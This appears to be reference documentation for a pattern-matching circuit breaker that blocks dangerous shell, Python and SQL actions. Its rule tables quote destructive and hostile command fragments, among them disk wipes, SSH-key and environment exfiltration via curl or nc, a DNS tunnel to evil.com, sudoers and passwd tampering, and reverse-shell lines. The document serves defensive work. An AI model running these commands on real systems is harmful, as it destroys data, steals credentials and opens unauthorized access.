# Circuit Breaker Reference

The circuit breaker is intentionally simple. No ML. No statistical inference. Pattern matching and categorical denial.

## Design Philosophy

The cost of incorrectly blocking a legitimate `rm -rf /` is always less than the cost of allowing a malicious one. The circuit breaker operates on this principle: if the blast radius of an action exceeds what any context could justify, block it unconditionally.

## Rule Categories

### FILESYSTEM_DESTRUCTION
Actions that irreversibly destroy files or filesystems.

| Rule | Catches | Near-misses (allowed) |
|------|---------|----------------------|
| `rm_rf_root` | `rm -rf /`, `rm -fr /`, `rm -rf /*` | `rm -rf /tmp/build` |
| `rm_rf_home` | `rm -rf ~`, `rm -rf /home/*`, `rm -rf $HOME` | `rm -rf ~/project/build` |
| `rm_rf_system_dirs` | `rm -rf /etc`, `rm -rf /usr`, `rm -rf /var` | `rm -rf /var/log/myapp/` |
| `mkfs_mounted` | `mkfs.ext4 /dev/sda1`, `mkfs -t xfs /dev/nvme0n1` | Discussion of mkfs in docs |
| `dd_zero_device` | `dd if=/dev/zero of=/dev/sda`, `dd if=/dev/urandom of=/dev/nvme0n1` | `dd if=image.iso of=output.img` |
| `format_windows` | `format C:`, `FORMAT D: /Q` | Python `format()` calls |
| `shutil_rmtree_system` | `shutil.rmtree('/')`, `shutil.rmtree('/etc')` | `shutil.rmtree('/tmp/build')` |

### CREDENTIAL_EXFILTRATION
Actions that send credentials to external destinations.

| Rule | Catches |
|------|---------|
| `credential_pipe_external` | `cat ~/.ssh/id_rsa \| curl ...` |
| `base64_credential_exfil` | `base64 ~/.ssh/id_rsa \| curl ...` |
| `secrets_to_world_readable` | `cp ~/.ssh/id_rsa /tmp/` |
| `ssh_key_copy_network` | `scp -r ~/.ssh/ remote:` |
| `env_secrets_exfil` | `env \| curl ...` |
| `credential_file_read_exfil` | `cat /etc/shadow \| nc ...` |
| `python_credential_exfil` | `requests.post(url, data=open('.ssh/id_rsa'))` |

### PRIVILEGE_ESCALATION
Actions that elevate permissions or modify access controls.

| Rule | Catches |
|------|---------|
| `modify_authorized_keys` | `echo "ssh-rsa ..." >> authorized_keys`, `tee -a authorized_keys` |
| `modify_sudoers` | `echo "user ALL=(ALL)" >> /etc/sudoers` |
| `modify_passwd` | `echo "root::0:0:..." >> /etc/passwd` |
| `chmod_777_sensitive` | `chmod 777 /etc`, `chmod -R 777 /var` |
| `setuid_manipulation` | `chmod u+s /usr/bin/bash`, `chmod 4755 binary` |
| `docker_socket_escape` | `docker run -v /var/run/docker.sock:...`, `--privileged` |
| `useradd_root` | `useradd -o -u 0`, `usermod -aG sudo` |

### DATA_EXFILTRATION
Bulk data transfer to external destinations.

| Rule | Catches |
|------|---------|
| `bulk_tar_curl` | `tar czf - / \| curl ...`, `tar \| nc ...` |
| `database_dump_exfil` | `mysqldump \| curl`, `pg_dump \| nc` |
| `large_upload` | `curl -T /large/file`, `curl --upload-file` |
| `find_pipe_exfil` | `find / \| tar \| curl`, `find -exec scp` |
| `dns_tunnel_exfil` | `dig $(cat secret).evil.com`, `nslookup $(xxd ...)` |

### SYSTEM_MODIFICATION
Changes to system services, scheduling, or configuration.

| Rule | Catches |
|------|---------|
| `modify_crontab` | `crontab -e`, `echo "* * * * *" >> /etc/cron.d/` |
| `modify_systemd` | `systemctl enable malicious.service` |
| `modify_launchd` | `launchctl load /Library/LaunchDaemons/...` |
| `kernel_module_ops` | `insmod rootkit.ko`, `modprobe` |
| `firewall_modification` | `iptables -A`, `ufw allow` |
| `package_manager_system` | `apt install --force-yes`, `dpkg --force-overwrite` |
| `hosts_file_modification` | `echo "127.0.0.1 google.com" >> /etc/hosts` |
| `shell_profile_modification` | `echo "export PATH=..." >> ~/.bashrc` |

### NETWORK_ABUSE
Establishing unauthorized network access.

| Rule | Catches |
|------|---------|
| `reverse_shell` | `bash -i >& /dev/tcp/...`, `nc -e /bin/sh`, `mkfifo /tmp/f; cat ...` |
| `port_scan` | `nmap`, `masscan` |

## AST Patterns

For SQL and code, regex alone misses semantic equivalents. AST patterns catch:

**SQL:**
- `DROP TABLE` / `DROP DATABASE` / `TRUNCATE`
- `DELETE FROM ... WHERE 1=1` (delete all rows)
- `UPDATE ... SET ... ;` without WHERE clause
- `GRANT ALL PRIVILEGES`
- `ALTER TABLE ... DROP COLUMN`

**Python/Shell:**
- `os.system()` with dangerous commands
- `subprocess.call(..., shell=True)` with dangerous args
- `eval()` / `exec()` with external input
- `shutil.rmtree()` on system paths
- `pickle.load()` from untrusted sources
- `os.chmod(..., 0o777)`

## Performance

All regexes are pre-compiled at `CircuitBreaker.__init__()`. Evaluation completes in <1ms for any rule set, typically 20-50 microseconds.

## Creating Custom Rules

```python
Rule(
    name="unique_name",
    category=RuleCategory.CUSTOM,  # or any category
    description="Human-readable description",
    patterns=["regex1", "regex2"],  # Any match triggers
    tool_types=["shell_exec"],      # Empty = matches all tools
    severity="critical",            # "critical" or "high"
)
```

`severity="critical"` means always block, no override. `severity="high"` blocks by default but can be allowlisted in future versions.
